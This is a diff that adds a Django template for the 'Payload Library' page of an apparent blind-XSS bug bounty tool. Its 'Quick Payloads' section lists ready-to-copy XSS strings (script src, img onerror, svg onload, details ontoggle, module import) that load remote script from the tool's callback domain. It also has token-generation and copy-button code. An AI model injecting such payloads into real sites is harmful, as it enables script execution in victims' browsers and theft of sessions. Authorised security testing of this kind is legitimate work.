@@ -1,0 +1,247 @@
+{% extends 'hunter/base.html' %}
+
+{% block title %}Payload Library - XJutsu v5{% endblock %}
+
+{% block content %}
+<div class="space-y-6">
+    <!-- Header -->
+    <div class="flex justify-between items-center">
+        <div>
+            <h1 class="text-3xl font-bold gradient-text">
+                <i class="fas fa-book mr-3"></i>Payload Library
+            </h1>
+            <p class="text-gray-400 mt-1">Framework-specific XSS patterns for bug bounty testing</p>
+        </div>
+        <div class="flex items-center space-x-4">
+            <span class="text-gray-400">
+                <i class="fas fa-database mr-2"></i>{{ total_payloads }} payloads
+            </span>
+            <button onclick="generateToken()" class="btn-primary px-4 py-2 rounded-lg font-semibold transition">
+                <i class="fas fa-key mr-2"></i>Generate Token
+            </button>
+        </div>
+    </div>
+
+    <!-- Quick Payloads -->
+    <div class="card rounded-xl p-6">
+        <h2 class="text-xl font-semibold mb-4">
+            <i class="fas fa-bolt text-yellow-500 mr-2"></i>Quick Payloads ({{ short_domain }})
+        </h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+            <div class="bg-dark-900 rounded-lg p-4">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-sm text-gray-400">Shortest Script Tag</span>
+                    <span class="text-xs text-green-400">23 chars</span>
+                </div>
+                <code class="text-sm text-primary break-all">&lt;script src=//{{ short_domain }}&gt;&lt;/script&gt;</code>
+                <button onclick="copyPayload(this)" class="mt-2 text-xs text-gray-500 hover:text-white">
+                    <i class="fas fa-copy mr-1"></i>Copy
+                </button>
+            </div>
+            <div class="bg-dark-900 rounded-lg p-4">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-sm text-gray-400">IMG Onerror</span>
+                    <span class="text-xs text-green-400">35 chars</span>
+                </div>
+                <code class="text-sm text-primary break-all">&lt;img src=x onerror=import('//{{ short_domain }}')&gt;</code>
+                <button onclick="copyPayload(this)" class="mt-2 text-xs text-gray-500 hover:text-white">
+                    <i class="fas fa-copy mr-1"></i>Copy
+                </button>
+            </div>
+            <div class="bg-dark-900 rounded-lg p-4">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-sm text-gray-400">SVG Onload</span>
+                    <span class="text-xs text-green-400">32 chars</span>
+                </div>
+                <code class="text-sm text-primary break-all">&lt;svg onload=import('//{{ short_domain }}')&gt;</code>
+                <button onclick="copyPayload(this)" class="mt-2 text-xs text-gray-500 hover:text-white">
+                    <i class="fas fa-copy mr-1"></i>Copy
+                </button>
+            </div>
+            <div class="bg-dark-900 rounded-lg p-4">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-sm text-gray-400">ES Module Import</span>
+                    <span class="text-xs text-blue-400">requires CORS</span>
+                </div>
+                <code class="text-sm text-primary break-all">&lt;script type=module&gt;import('//{{ short_domain }}/m.js')&lt;/script&gt;</code>
+                <button onclick="copyPayload(this)" class="mt-2 text-xs text-gray-500 hover:text-white">
+                    <i class="fas fa-copy mr-1"></i>Copy
+                </button>
+            </div>
+            <div class="bg-dark-900 rounded-lg p-4">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-sm text-gray-400">Details Toggle</span>
+                    <span class="text-xs text-green-400">interaction</span>
+                </div>
+                <code class="text-sm text-primary break-all">&lt;details open ontoggle=import('//{{ short_domain }}')&gt;</code>
+                <button onclick="copyPayload(this)" class="mt-2 text-xs text-gray-500 hover:text-white">
+                    <i class="fas fa-copy mr-1"></i>Copy
+                </button>
+            </div>
+            <div class="bg-dark-900 rounded-lg p-4">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-sm text-gray-400">With Token</span>
+                    <span class="text-xs text-purple-400">single-use</span>
+                </div>
+                <code class="text-sm text-primary break-all" id="tokenPayload">&lt;script src=//{{ short_domain }}?t=TOKEN&gt;&lt;/script&gt;</code>
+                <button onclick="copyPayload(this)" class="mt-2 text-xs text-gray-500 hover:text-white">
+                    <i class="fas fa-copy mr-1"></i>Copy
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Category Navigation -->
+    <div class="flex flex-wrap gap-2">
+        {% for cat_key, cat_data in library.items %}
+        <a href="#{{ cat_key }}" class="px-3 py-1 rounded-full text-sm bg-dark-700 hover:bg-primary transition">
+            {{ cat_data.name }}
+        </a>
+        {% endfor %}
+    </div>
+
+    <!-- Payload Categories -->
+    {% for cat_key, cat_data in library.items %}
+    <div id="{{ cat_key }}" class="card rounded-xl p-6">
+        <h2 class="text-xl font-semibold mb-4 flex items-center">
+            {% if cat_key == 'react' %}
+            <i class="fab fa-react text-blue-400 mr-2"></i>
+            {% elif cat_key == 'vue' %}
+            <i class="fab fa-vuejs text-green-400 mr-2"></i>
+            {% elif cat_key == 'angular' %}
+            <i class="fab fa-angular text-red-400 mr-2"></i>
+            {% elif cat_key == 'dom_clobbering' %}
+            <i class="fas fa-sitemap text-yellow-400 mr-2"></i>
+            {% elif cat_key == 'csp_probe' %}
+            <i class="fas fa-shield-alt text-purple-400 mr-2"></i>
+            {% elif cat_key == 'mutation' %}
+            <i class="fas fa-dna text-pink-400 mr-2"></i>
+            {% elif cat_key == 'polyglot' %}
+            <i class="fas fa-code text-orange-400 mr-2"></i>
+            {% else %}
+            <i class="fas fa-bug text-primary mr-2"></i>
+            {% endif %}
+            {{ cat_data.name }}
+            <span class="ml-2 text-xs text-gray-500">({{ cat_data.payloads|length }})</span>
+        </h2>
+
+        <div class="space-y-3">
+            {% for payload in cat_data.payloads %}
+            <div class="bg-dark-900 rounded-lg p-4 hover:border-primary border border-transparent transition">
+                <div class="flex justify-between items-start mb-2">
+                    <span class="font-medium text-gray-200">{{ payload.name }}</span>
+                    <div class="flex items-center space-x-2">
+                        <span class="text-xs text-gray-500">{{ payload.char_count }} chars</span>
+                        {% if payload.context %}
+                        <span class="text-xs px-2 py-0.5 bg-dark-700 rounded text-gray-400">{{ payload.context }}</span>
+                        {% endif %}
+                    </div>
+                </div>
+                <pre class="text-sm text-primary overflow-x-auto p-2 bg-black rounded"><code>{{ payload.payload }}</code></pre>
+                <div class="flex justify-between items-center mt-2">
+                    {% if payload.notes %}
+                    <span class="text-xs text-gray-500">{{ payload.notes }}</span>
+                    {% else %}
+                    <span></span>
+                    {% endif %}
+                    <button onclick="copyCode(this)" class="text-xs text-gray-500 hover:text-white">
+                        <i class="fas fa-copy mr-1"></i>Copy
+                    </button>
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+    {% empty %}
+    <div class="card rounded-xl p-12 text-center">
+        <i class="fas fa-inbox text-6xl text-gray-600 mb-4"></i>
+        <h3 class="text-xl font-semibold text-gray-400">Payload Library Empty</h3>
+        <p class="text-gray-500 mt-2">Run the management command to load payloads:</p>
+        <code class="text-sm text-primary mt-4 block">python manage.py load_payload_library</code>
+    </div>
+    {% endfor %}
+</div>
+
+<!-- Token Modal -->
+<div id="tokenModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center z-50">
+    <div class="card rounded-xl p-6 max-w-md w-full mx-4">
+        <h3 class="text-xl font-semibold mb-4">
+            <i class="fas fa-key text-yellow-500 mr-2"></i>Generate Token
+        </h3>
+        <div class="space-y-4">
+            <div>
+                <label class="block text-sm text-gray-400 mb-1">Expires In (minutes)</label>
+                <input type="number" id="tokenExpiry" value="60" class="w-full bg-dark-900 border border-gray-700 rounded px-3 py-2 focus:border-primary outline-none">
+            </div>
+            <div>
+                <label class="block text-sm text-gray-400 mb-1">Max Uses (0 = unlimited)</label>
+                <input type="number" id="tokenMaxUses" value="1" class="w-full bg-dark-900 border border-gray-700 rounded px-3 py-2 focus:border-primary outline-none">
+            </div>
+            <div id="tokenResult" class="hidden">
+                <label class="block text-sm text-gray-400 mb-1">Generated Payload</label>
+                <code id="generatedPayload" class="block text-sm text-green-400 bg-dark-900 p-3 rounded break-all"></code>
+            </div>
+            <div class="flex justify-end space-x-3">
+                <button onclick="closeTokenModal()" class="px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 transition">Cancel</button>
+                <button onclick="createToken()" class="btn-primary px-4 py-2 rounded-lg transition">Generate</button>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+function copyPayload(btn) {
+    const code = btn.parentElement.querySelector('code').textContent;
+    navigator.clipboard.writeText(code);
+    btn.innerHTML = '<i class="fas fa-check mr-1"></i>Copied!';
+    setTimeout(() => {
+        btn.innerHTML = '<i class="fas fa-copy mr-1"></i>Copy';
+    }, 2000);
+}
+
+function copyCode(btn) {
+    const code = btn.closest('.bg-dark-900').querySelector('pre code').textContent;
+    navigator.clipboard.writeText(code);
+    btn.innerHTML = '<i class="fas fa-check mr-1"></i>Copied!';
+    setTimeout(() => {
+        btn.innerHTML = '<i class="fas fa-copy mr-1"></i>Copy';
+    }, 2000);
+}
+
+function generateToken() {
+    document.getElementById('tokenModal').classList.remove('hidden');
+    document.getElementById('tokenModal').classList.add('flex');
+    document.getElementById('tokenResult').classList.add('hidden');
+}
+
+function closeTokenModal() {
+    document.getElementById('tokenModal').classList.add('hidden');
+    document.getElementById('tokenModal').classList.remove('flex');
+}
+
+async function createToken() {
+    const expiry = document.getElementById('tokenExpiry').value;
+    const maxUses = document.getElementById('tokenMaxUses').value;
+
+    const response = await fetch('{% url "generate_token" %}', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': '{{ csrf_token }}'
+        },
+        body: JSON.stringify({
+            expires_minutes: parseInt(expiry),
+            max_uses: parseInt(maxUses)
+        })
+    });
+
+    const data = await response.json();
+
+    document.getElementById('tokenResult').classList.remove('hidden');
+    document.getElementById('generatedPayload').textContent = data.script_tag;
+    document.getElementById('tokenPayload').textContent = data.script_tag;
+}
+</script>
+{% endblock %}
